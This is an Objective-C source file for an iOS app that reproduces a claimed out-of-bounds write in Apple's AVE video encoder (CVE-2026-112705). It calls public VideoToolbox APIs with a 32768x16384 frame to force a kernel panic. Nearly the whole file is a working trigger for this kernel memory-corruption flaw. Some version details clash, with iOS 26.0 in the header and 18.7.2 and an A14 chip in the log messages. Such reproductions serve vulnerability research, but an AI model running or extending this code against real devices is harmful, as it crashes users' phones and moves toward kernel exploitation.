//
//  vt112705.m — 复现 CVE-2026-112705（AVEVideoEncoder OOB write）
//
//  来源：github.com/Lak453/CVE-2026-112705-poc
//  该仓库用纯 VT 公开 API 复现，iPhone18,4 / iOS 26.0 实测 2/2 次 kernel panic：
//     panic signature: "dart-ave" PTE-invalid write fault
//
//  触发参数（照抄）：
//    codec  = H.264
//    W x H  = 32768 x 16384     = 2^29（低于 AVD 的 2^30 上限，也都在 65535 内）
//    buffer = BGRA, attributes = NULL（无 IOSurface）
//    buffer 真实大小 = 32768x16384x4 = 2 GB
//
//  guard（预期正常）：16384 x 16384 = 2^28，同参数
//
//  为什么之前 vtframe 没打到：
//    1) H = 131072/131073/262160 全部 > 65535（SPS 高度字段是 u16）
//    2) 用 64x64 小 buffer 配大声明 -> VT 检测不匹配就静默跳过（syslog 无 Resolution:）
//
//  预期：guard 正常 -> trigger 触发 kernel panic -> 设备重启
//

#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static void L(const char *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    NSString *s = [NSString stringWithUTF8String:buf];
    if (!s) return;
    NSLog(@"VT112705 %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vt112705.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_sync(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
        }
    });
}

typedef void *VTCompressionSessionRef;
typedef void *CVPixelBufferRef;
typedef struct { int64_t value; int32_t timescale; uint32_t flags; int64_t epoch; } CMTime;

static const uint32_t CODEC_H264  = 0x61766331;   // 'avc1'
static const uint32_t PIXFMT_BGRA = 0x42475241;   // 'BGRA'

typedef int32_t (*fn_create_t)(void *, int32_t, int32_t, uint32_t,
                               void *, void *, void *, void *, void *, VTCompressionSessionRef *);
typedef int32_t (*fn_prepare_t)(VTCompressionSessionRef);
typedef int32_t (*fn_encode_t)(VTCompressionSessionRef, CVPixelBufferRef, CMTime, CMTime,
                               void *, void *, void *);
typedef void    (*fn_inv_t)(VTCompressionSessionRef);
typedef int32_t (*fn_pbnew_t)(void *, size_t, size_t, uint32_t, void *, CVPixelBufferRef *);
typedef void    (*fn_pbfree_t)(CVPixelBufferRef);

static fn_create_t  p_create  = NULL;
static fn_prepare_t p_prepare = NULL;
static fn_encode_t  p_encode  = NULL;
static fn_inv_t     p_inv     = NULL;
static fn_pbnew_t   p_pbnew   = NULL;
static fn_pbfree_t  p_pbfree  = NULL;

static const char *st_name(int32_t st)
{
    switch (st) {
        case 0:      return "noErr";
        case -12902: return "kVTParameterErr";
        case -12903: return "kVTInvalidSessionErr";
        case -12904: return "kVTAllocationFailedErr";
        case -12906: return "kVTDecompressionFailedErr";
        case -12908: return "kVTNotSupportedErr";
        case -6660:  return "kCVInvalidArgument";
        case -6661:  return "kCVInvalidSize";
        case -6662:  return "kCVAllocationFailed";
        case -50:    return "paramErr";
        case -108:   return "memFullErr";
        default:     return "?";
    }
}

static CMTime T_zero(void) { CMTime t = {0,0,0,0}; return t; }

static void attempt(const char *tag, int32_t W, int32_t H)
{
    int64_t px = (int64_t)W * (int64_t)H;
    int64_t bytes = px * 4;
    L("");
    L("========== %s: %d x %d ==========", tag, W, H);
    L("    W*H = %lld (%.3f x 2^30)   buffer = %.2f GB",
      (long long)px, (double)px / 1073741824.0, (double)bytes / 1073741824.0);
    SetStatus([NSString stringWithFormat:@"%s %dx%d", tag, W, H]);

    VTCompressionSessionRef s = NULL;
    L("  [1] VTCompressionSessionCreate (H.264) ...");
    int32_t st = p_create(NULL, W, H, CODEC_H264, NULL, NULL, NULL, NULL, NULL, &s);
    L("      -> %d %s  session=%p", st, st_name(st), s);
    if (st != 0 || !s) { L("      Create 失败，中止"); return; }

    CVPixelBufferRef pb = NULL;
    L("  [2] CVPixelBufferCreate %dx%d BGRA (attributes=NULL) ...", W, H);
    L("      预计分配 %.2f GB", (double)bytes / 1073741824.0);
    st = p_pbnew(NULL, (size_t)W, (size_t)H, PIXFMT_BGRA, NULL, &pb);
    L("      -> %d %s  pb=%p", st, st_name(st), pb);
    if (st != 0 || !pb) {
        L("      buffer 分配失败（内存不足），中止");
        p_inv(s); CFRelease((CFTypeRef)s);
        return;
    }

    L("  [3] VTCompressionSessionPrepareToEncodeFrames ...");
    st = p_prepare(s);
    L("      -> %d %s", st, st_name(st));

    L("  [4] VTCompressionSessionEncodeFrame ...  <=== 触发行");
    L("      若 AVE2 按此尺寸算 buffer 且溢出，这里 panic");
    CMTime z = T_zero();
    st = p_encode(s, pb, z, z, NULL, NULL, NULL);
    L("      -> %d %s", st, st_name(st));

    L("  [5] 清理 ...");
    p_pbfree(pb);
    p_inv(s);
    CFRelease((CFTypeRef)s);
    L("      本次完成，没有崩溃");
}

static void run(void)
{
    L("===== CVE-2026-112705 复现 =====");
    L("uid=%d pid=%d", getuid(), getpid());
    L("来源: github.com/Lak453/CVE-2026-112705-poc");
    L("  GUARD   16384x16384  预期正常");
    L("  TRIGGER 32768x16384  预期 kernel panic (dart-ave PTE-invalid write)");
    L("");

    void *vt = dlopen("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox", RTLD_NOW);
    void *cv = dlopen("/System/Library/Frameworks/CoreVideo.framework/CoreVideo", RTLD_NOW);
    L("[dlopen] VT=%p CV=%p", vt, cv);
    if (!vt || !cv) { L("加载失败"); SetStatus(@"加载失败"); return; }

    p_create  = (fn_create_t)dlsym(vt, "VTCompressionSessionCreate");
    p_prepare = (fn_prepare_t)dlsym(vt, "VTCompressionSessionPrepareToEncodeFrames");
    p_encode  = (fn_encode_t)dlsym(vt, "VTCompressionSessionEncodeFrame");
    p_inv     = (fn_inv_t)dlsym(vt, "VTCompressionSessionInvalidate");
    p_pbnew   = (fn_pbnew_t)dlsym(cv, "CVPixelBufferCreate");
    p_pbfree  = (fn_pbfree_t)dlsym(cv, "CVPixelBufferRelease");
    L("[dlsym] create=%p prepare=%p encode=%p pbnew=%p", p_create, p_prepare, p_encode, p_pbnew);
    if (!p_create || !p_prepare || !p_encode || !p_pbnew) {
        L("dlsym 失败"); SetStatus(@"dlsym 失败"); return;
    }

    attempt("GUARD", 16384, 16384);
    sleep(3);
    attempt("TRIGGER", 32768, 16384);

    L("");
    L("===== 两次都跑完，没有崩溃 =====");
    L("  => 18.7.2 上可能已修（112705 修于 26.7）");
    L("  => 或 A14 的能力表拒绝了这组尺寸");
    L("  => 下一步试中间尺寸找边界");
    SetStatus(@"完成，看日志");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("vt112705.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 34)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"vt112705...";
    gStatus.textColor = [UIColor colorWithRed:1 green:0.4 blue:0.4 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 90, self.window.bounds.size.width, h - 90)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
